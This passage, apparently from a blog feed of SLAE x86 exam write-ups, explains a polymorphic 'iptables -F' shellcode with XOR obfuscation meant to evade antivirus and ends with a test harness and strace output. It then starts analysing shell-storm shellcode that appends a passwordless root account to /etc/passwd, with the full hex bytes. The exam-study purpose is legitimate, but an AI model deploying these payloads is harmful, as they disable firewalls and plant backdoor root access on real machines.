    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x014d4c5b&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This one differs the most in my opinion, and it's also the reason behind the increment of &lt;code&gt;11 bytes&lt;/code&gt; compared to the original shellcode.&lt;/p&gt;
&lt;p&gt;Given the path of the executable is pushed to the stack in clear-text, an &lt;code&gt;AntiVirus&lt;/code&gt; product could easily find it, and therefore flag the shellcode as malicious.&lt;/p&gt;
&lt;p&gt;Therefore, I decided to make a compromise and XOR two of the most obvious DWORDs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x61747069&lt;/code&gt; -&amp;gt; &amp;quot;ipta&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x732f2f2f&lt;/code&gt; -&amp;gt; &amp;quot;///s&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One could also XOR the other two DWORDs, based on how many bytes you can add to the shellcode. In this case, the XOR key is the DWORD &lt;code&gt;0x72626374&lt;/code&gt; (string: &lt;code&gt;rbct&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Follows the second-to-last piece of Assembly code:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;; save the pointer to the string into EBX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; instead of 'push eax' use 'push edx', as they are both set to 0x0 &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Starting from the top, I used the &lt;code&gt;PUSH-POP&lt;/code&gt; technique, instead of the instruction &lt;code&gt;mov ebx, esp&lt;/code&gt;, as it changes the resulting bytes, while using the same numer of bytes.&lt;/p&gt;
&lt;p&gt;Next, I've repeated what I've already done before: use &lt;code&gt;push edx&lt;/code&gt; instead of &lt;code&gt;push eax&lt;/code&gt;, because they are both set to &lt;code&gt;0x00000000&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The instructions &lt;code&gt;push edi&lt;/code&gt; and &lt;code&gt;push ebx&lt;/code&gt; aren't too different from the original shellcode, I had to use the register &lt;code&gt;edi&lt;/code&gt; because I've changed it previously, storing the pointer to the string &lt;code&gt;-F&lt;/code&gt; into &lt;code&gt;EDI&lt;/code&gt; instead of &lt;code&gt;ESI&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Finally, it's time to analyse the last piece of Assembly code:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; use the PUSH-POP technique instead 'mov ecx, esp'&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call execve&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;At the end of the original shellcode there's the instruction &lt;code&gt;mov al, 0xb&lt;/code&gt;. I chose to split it into two instructions (&lt;code&gt;mov al, 0xa&lt;/code&gt; and &lt;code&gt;inc eax&lt;/code&gt;), as it adds only one byte more compared to the original shellcode.&lt;/p&gt;
&lt;p&gt;I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.&lt;/p&gt;
&lt;p&gt;Next, I replaced the instruction &lt;code&gt;mov ecx,esp&lt;/code&gt; with two instructions, using the &lt;code&gt;PUSH-POP&lt;/code&gt; technique.&lt;/p&gt;
&lt;p&gt;Compared to the original shellcode, I didn't have to clear EDX, as it was already cleared from the start (by means of &lt;code&gt;mul ebx&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;The last instruction is identical to the one from the original shellcode.&lt;/p&gt;
&lt;h3 id=&quot;testing&quot;&gt;Testing&lt;/h3&gt;
&lt;p&gt;To test the polymorphic shellcode, I've used the following C program:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To compile:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; test_polymorphic_shellcode test_polymorphic_shellcode.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once I've run it, I could confirm it executes &lt;code&gt;iptables -F&lt;/code&gt; successfully:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@slae:~/exam/assignment_6/3&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;strace &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;trace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;execve ./test_polymorphic_shellcode 
&lt;span class=&quot;c&quot;&gt;# execve(&quot;./test_polymorphic_shellcode&quot;, [&quot;./test_polymorphic_shellcode&quot;], [/* 16 vars */]) = 0&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Shellcode length: 58&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# execve(&quot;///sbin/iptables&quot;, [&quot;///sbin/iptables&quot;, &quot;-F&quot;], [/* 0 vars */]) = 0&lt;/span&gt;

rbct@slae:~/exam/assignment_6/3&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, it confirms the length of the shellcode is &lt;code&gt;58 bytes&lt;/code&gt;. More important is the last &lt;code&gt;execve&lt;/code&gt; syscall. It executed the command &lt;code&gt;///sbin/iptables -F&lt;/code&gt; and returned &lt;code&gt;0&lt;/code&gt;, meaning it succeeded.&lt;/p&gt;
</description>
        <pubDate>Tue, 04 Jan 2022 00:00:00 +0100</pubDate>
        <link>/22/01/04/slae32-assignment-6_3</link>
        <guid isPermaLink="true">/22/01/04/slae32-assignment-6_3</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>polymorphism</category>
        
        <category>x86</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #6 Part 2</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 6th assignment requires you to analyze 3 shellcodes from &lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;Shell-Storm&lt;/a&gt; and &amp;quot;create polymorphic versions of them to beat pattern matching&amp;quot;.&lt;/p&gt;
&lt;p&gt;There's only 1 constraint:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The polymorphic versions cannot be larger 150% of the existing shellcode&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I chose the following shellcodes:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-812.php&quot;&gt;Linux/x86 - chmod 666 /etc/passwd &amp;amp; /etc/shadow - 57 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-561.php&quot;&gt;Linux/x86 - append /etc/passwd &amp;amp; exit() - 107 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-825.php&quot;&gt;Linux/x86 - iptables --flush - 43 bytes&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In this part I'll create a polymorphic version of the 2nd shellcode.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source code&lt;/h2&gt;
&lt;p&gt;The files for this part of the assignment are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm&quot;&gt;original_shellcode.nasm&lt;/a&gt;, the original shellcode from Shell-Storm&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/polymorphic_shellcode.nasm&quot;&gt;polymorphic_shellcode.nasm&lt;/a&gt;, my polymorphic version of the shellcode above&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/test_polymorphic_shellcode.c&quot;&gt;test_polymorphic_shellcode.c&lt;/a&gt;, a C program for testing the polymorphic shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;First, we need to analyse the original shellcode:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;23&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode.bin

ndisasm &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Follows the output of &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; Use the JMP-CALL-POP technique get a pointer to the string starting from address&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   0000003A and ending at 00000069&lt;/span&gt;
